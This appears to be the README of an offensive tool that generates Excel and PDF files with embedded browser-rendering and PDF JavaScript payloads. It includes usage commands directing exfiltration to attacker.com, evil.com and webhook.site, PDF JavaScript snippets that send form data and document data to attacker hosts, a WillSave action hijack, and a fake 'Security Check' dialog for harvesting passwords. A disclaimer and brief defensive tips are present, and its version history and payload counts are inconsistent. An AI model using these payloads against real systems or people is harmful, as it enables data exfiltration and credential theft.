# Excel Browser Rendering XSS Tool v3.0 - Advanced Excel Browser Exploitation

## 🚀 100+ Excel Browser Rendering Payloads

A research-grade tool for generating Excel files with sophisticated payloads designed to exploit Excel files when rendered in web browsers. Features 100+ distinct payloads targeting Chrome Excel rendering, Firefox Excel handling, Safari Excel integration, Edge Excel processing, Office 365 Web Excel, and Google Sheets Excel import functionality.

## 📁 Project Structure

```
XSS-PDF/
├── PDF/                                    # Legacy PDF generation tools
│   ├── script.py                           # Original PDF Generator
│   ├── Another-Script.py                   # Browser-specific PDF generator  
│   ├── Files/                              # Generated PDF files output directory
│   └── IMPROVEMENTS.md                     # Feature improvements documentation
├── export_to_excel.py                      # NEW: Excel browser payload exporter
├── merge_json_payloads.py                  # JSON payload database merger
├── payload_database.json                   # Excel browser payload database (45+ payloads)
├── excel_browser_payload_database.json     # Comprehensive Excel browser database
├── requirements.txt                        # Python dependencies for Excel export
├── README.md                               # This file
└── Script-1-Readme.md                     # Additional documentation
```

## ⚠️ Legal Disclaimer

This tool is designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.

## 🎯 Excel Browser Rendering Research Database

### Browser-Specific Excel Targeting
- **Chrome Excel Rendering**: Google Drive integration, Chromium-based Excel viewer exploitation
- **Firefox Excel Handling**: Plugin-based Excel rendering, Gecko engine integration abuse
- **Safari Excel Integration**: macOS Excel rendering, WebKit engine exploitation
- **Edge Excel Processing**: Windows Excel integration, WebView2 and ActiveX legacy exploitation
- **Office 365 Web Excel**: Browser-based Excel application, SharePoint integration abuse
- **Google Sheets Excel Import**: Excel file processing and conversion vulnerabilities

### Comprehensive Research Foundation
- **100+ CVE References** for Excel browser rendering vulnerabilities
- **Security Conference Research** (BlackHat, DEF CON, BSides presentations)
- **GitHub Security Research** repositories and POC exploits
- **Bug Bounty Platform Reports** (HackerOne, Bugcrowd disclosures)
- **Darknet Forum Analysis** for advanced Excel exploitation techniques
- **Academic Security Papers** on Excel browser security vulnerabilities

## 🔒 Excel Browser Exploitation Features

### Advanced Excel File Formats
- **Legacy .xls Format**: Reduced security restrictions, ActiveX control support
- **Modern .xlsx Format**: XML-based structure with XXE exploitation vectors
- **Macro-enabled .xlsm**: VBA macro execution in browser context
- **Binary .xlsb Format**: Performance optimized with detection evasion capabilities
### Excel Browser Payload Categories
- **Formula Injection**: Malicious Excel formulas executed in browser context (DDE, RTD functions)
- **Macro Execution**: VBA macro payloads for browser-rendered Excel files
- **External Data Connections**: HTTP/UNC path abuse for data exfiltration and credential harvesting
- **XML External Entity (XXE)**: Excel XML format exploitation for file disclosure
- **CSV Injection**: CSV-based formula injection in browser Excel viewers
- **Browser DOM Access**: Excel-to-browser DOM manipulation and cross-frame access

## 🚀 Features

- **100+ Excel Browser Payloads**: Comprehensive collection targeting Excel browser rendering
- **Legacy Format Support**: Targets older Excel formats (.xls) with reduced security restrictions
- **Cross-Browser Compatibility**: Works across Chrome, Firefox, Safari, Edge, Office 365, Google Sheets
- **Advanced Research Base**: 100+ CVE references, security conferences, GitHub research, darknet analysis
- **Excel Format Diversity**: .xls, .xlsx, .xlsm, .xlsb format exploitation techniques
- **Professional Excel Export**: Multi-sheet analysis with comprehensive research documentation
- **CVE Reference Integration**: Each payload linked to relevant Excel security vulnerabilities

## 📊 Excel Browser Payload Export (NEW)

### Overview
The Excel browser payload export provides comprehensive security research data focused on Excel files rendered in web browsers, targeting legacy Excel formats with reduced security restrictions.

### Features
- **Excel Browser Focus**: Payloads targeting Excel files opened in web browsers
- **Legacy Format Targeting**: Emphasis on older Excel standards (.xls) with lower security restrictions
- **Comprehensive Research**: GitHub, CVE database, darknet forums, security conferences analysis
- **Multiple Analysis Sheets**: Browser-specific, Excel format analysis, CVE references, research summary
- **Professional Formatting**: Tables, conditional formatting, and organized layouts for security research

### Usage
```bash
# Install dependencies for Excel export
pip install -r requirements.txt

# Export Excel browser payload database to Excel format
python3 export_to_excel.py

# Generated file: excel_browser_payload_database_YYYYMMDD_HHMMSS.xlsx
```

### Excel Sheet Contents
- **All Excel Browser Payloads**: Complete database with Excel browser exploitation payloads
- **Browser Sheets**: Chrome, Firefox, Safari, Edge, Office 365 Web, Google Sheets specific payloads
- **Excel Category Analysis**: Breakdown by Excel attack category (formula injection, macro execution, etc.)
- **Excel CVE References**: Excel browser security vulnerability references and affected components
- **Excel Research Summary**: Methodology, sources, and comprehensive research foundation

## 📋 Usage Examples

### Excel Browser Payload Generation
```bash
# Export comprehensive Excel browser payload database
python3 export_to_excel.py
```

### Legacy PDF Usage (Maintained)
```bash
# Navigate to the PDF directory
cd PDF

# Generate Chrome-specific payloads
python3 script.py -b chrome -u http://attacker.com/collect

# Generate all browser payloads with data exfiltration
python3 script.py -b all -u https://webhook.site/xyz

# Target specific payload category
python3 script.py -b firefox --category file_system -u http://evil.com

# Limit number of payloads generated
python3 script.py -b adobe --count 50 -u http://collector.com
```

### Advanced Usage
```bash
# Navigate to the PDF directory first
cd PDF

# Export payload database as JSON
python3 script.py -b all --output-json

# Verbose output with payload details
python3 script.py -b safari -u http://test.com -v

# List research sources and CVE references
python3 script.py --list-research

# Filter by specific categories
python3 script.py -b chrome --category command_execution -u http://log.site

# Use the alternative script for browser-specific PDFs
python3 Another-Script.py -b chrome -u http://test.com
```

## 🎯 Browser Targets

| Browser | PDF Library | Payload Count | Focus Areas |
|---------|------------|---------------|-------------|
| Chrome | PDFium | 200+ | V8 engine exploitation, IPC abuse, process injection |
| Firefox | PDF.js | 200+ | CSP bypass, SpiderMonkey exploitation, Content Security Policy evasion |
| Safari | PDFKit | 200+ | macOS integration, WebKit messageHandlers, Objective-C bridge abuse |
| Adobe | Acrobat/Reader | 250+ | Full JavaScript API, privilege escalation, file system access |
| Edge | Edge PDF | 150+ | Windows integration, WebView exploitation, registry manipulation |

## 📊 Payload Categories

| Category | Description | Example Techniques |
|----------|-------------|-------------------|
| `dom_access` | Browser DOM manipulation from PDF context | parent.window.location, postMessage abuse |
| `file_system` | Local file system access and directory traversal | file:// URI manipulation, browseForDoc() |
| `command_execution` | System command execution and process spawning | Protocol handler abuse, ms-msdt exploitation |
| `sandbox_escape` | PDF sandbox restriction bypasses | IPC manipulation, memory corruption |
| `network_exfiltration` | Data exfiltration and covert channels | Form submission, XMLHttpRequest alternatives |

## 🛠️ Installation & Requirements

### Requirements
- Python 3.x
- For Excel export: pandas, openpyxl (install via requirements.txt)

### Installation
```bash
git clone https://github.com/SNGWN/XSS-PDF.git
cd XSS-PDF

# Install dependencies for Excel export functionality (optional)
pip install -r requirements.txt

# Navigate to PDF folder for main scripts
cd PDF
```

## 📖 Usage

### Basic Commands

```bash
# Navigate to the PDF directory
cd PDF

# Show help and available options
python3 script.py --help

# List all available XSS payload types
python3 script.py --list-types

# Generate basic PDF files (backward compatibility)
python3 script.py -o pdf

# Generate specific XSS payload type
python3 script.py -t alert

# Generate all XSS payload types
python3 script.py -t all

# Generate HTML XSS test file
python3 script.py -o html
```

### Advanced PDF Sandbox Escape Usage

```bash
# Navigate to PDF directory first
cd PDF

# PDF data exfiltration via form submission escape
python3 script.py -t cookie -u http://attacker.com/collect

# PDF action-based sandbox escape
python3 script.py -t action -u http://collaborator.burpsuite.com

# PDF dialog manipulation for credential harvesting
python3 script.py -t dialog -u http://logger.example.com

# PDF file system escape attempts
python3 script.py -t file

# Generate all PDF sandbox escape types
python3 script.py -t all -u http://collaborator.burpsuite.com

# PDF network escape via URL launching
python3 script.py -t network -u https://webhook.site/unique-id
```

## 🏁 Command Line Flags

| Flag | Long Form | Description | Example |
|------|-----------|-------------|---------|
| `-h` | `--help` | Show help message | `python3 script.py --help` |
| `-u` | `--url` | Target URL for data exfiltration | `-u http://evil.com/collect` |
| `-o` | `--output` | Output format (pdf/html) | `-o pdf` |
| `-s` | `--script` | Custom JavaScript payload | `-s "app.alert('test')"` |
| `-t` | `--type` | XSS payload type or 'all' | `-t cookie` |
| | `--list-types` | List available payload types | `--list-types` |

## 📁 Output Files

### PDF Files
**All generated PDF files are automatically stored in a `Files/` directory.**

The tool creates the `Files` directory automatically if it doesn't exist. Generated PDF files follow the naming convention: `xss_<type>_<timestamp>.pdf`

Examples:
- `Files/xss_alert_20240115_143022.pdf`
- `Files/xss_cookie_20240115_143025.pdf`
- `Files/xss_custom_20240115_143030.pdf`

### HTML Files
Generated HTML files follow the naming convention: `xss_test_<timestamp>.html`

Example:
- `xss_test_20240115_143035.html`

## 🎯 PDF Sandbox Escape Examples

### PDF Form Submission Escape
```javascript
// PDF-specific data exfiltration
this.submitForm({
    cURL: "http://attacker.com/collect",
    cSubmitAs: "HTML",
    cCharset: "utf-8"
});
```

### PDF URL Launching Escape
```javascript
// Escape sandbox via URL launching
app.launchURL("http://attacker.com/escape?data=" + encodeURIComponent(data), true);
```

### PDF Action Hijacking
```javascript
// Hijack document actions for persistent escape
this.setAction("WillSave", 
    "app.launchURL('http://attacker.com/save-intercept', true);"
);
```

### PDF Dialog Exploitation
```javascript
// Credential harvesting via PDF dialogs
var creds = app.response({
    cQuestion: "Enter your credentials:",
    cTitle: "Security Check",
    bPassword: true
});
```

## 🔍 PDF Security Testing Methodology

1. **Generate PDF Test Files**: Use the tool to create PDF files with various sandbox escape payloads
2. **Upload/Embed Testing**: Test file upload functionality on target applications
3. **PDF Viewer Analysis**: Test different PDF viewers (Adobe Reader, browser built-ins, etc.)
4. **Sandbox Escape Monitoring**: Monitor for successful escapes via URL launching, form submission
5. **Data Exfiltration Testing**: Use URL flag to test actual data extraction capabilities
6. **Action Persistence Testing**: Test if PDF actions persist across viewer sessions
7. **Dialog Security Testing**: Test credential harvesting via PDF dialog manipulation

## 🛡️ PDF-Specific Defensive Measures

To protect against PDF sandbox escape attacks:

- **Disable PDF JavaScript**: Configure PDF viewers to disable JavaScript execution
- **PDF Upload Restrictions**: Implement strict PDF upload validation and content analysis
- **Sandbox Hardening**: Use additional sandboxing layers beyond PDF viewer defaults
- **Network Monitoring**: Monitor for unusual outbound connections from PDF viewer processes
- **Content Security Policy**: Implement CSP headers that restrict PDF-initiated requests
- **PDF Content Analysis**: Scan uploaded PDFs for JavaScript and suspicious structures
- **User Education**: Train users on PDF security risks and safe viewing practices

## 🚨 Security Considerations

- Always obtain proper authorization before testing
- Use in controlled environments only
- Be aware of legal implications
- Respect responsible disclosure practices
- Monitor and log all testing activities

## 📈 Changelog

### Version 3.0 (Current) - PDF Sandbox Escape Enhancement
- **Complete rewrite for PDF sandbox context**
- **PDF-specific JavaScript APIs**: Replaced browser APIs with PDF JavaScript
- **12 sophisticated sandbox escape techniques**
- **Enhanced PDF structure**: More complex PDF objects for better escape potential
- **Action-based persistence**: PDF action hijacking for persistent attacks
- **Dialog exploitation**: Credential harvesting via PDF dialogs
- **Form submission escapes**: Data exfiltration via PDF form submission
- **URL launching escapes**: Sandbox escape via app.launchURL()
- **File system escape attempts**: PDF-specific file access methods
- **Comprehensive error handling for PDF context**

### Version 1.0 (Legacy)
- Basic PDF generation with simple XSS payloads
- Limited to 2-3 payload types
- Basic URL and custom script support

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add comprehensive tests
4. Follow existing code style
5. Submit a pull request with detailed description

## 📄 License

This project is for educational and authorized security testing purposes only. Please use responsibly and in accordance with applicable laws and regulations.

## 🔗 Resources

- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PDF Security Research](https://blog.didierstevens.com/programs/pdf-tools/)
- [JavaScript Security Best Practices](https://developer.mozilla.org/en-US/docs/Web/Security)

---

**Remember**: This tool is for authorized security testing only. Always obtain proper permission before testing any systems.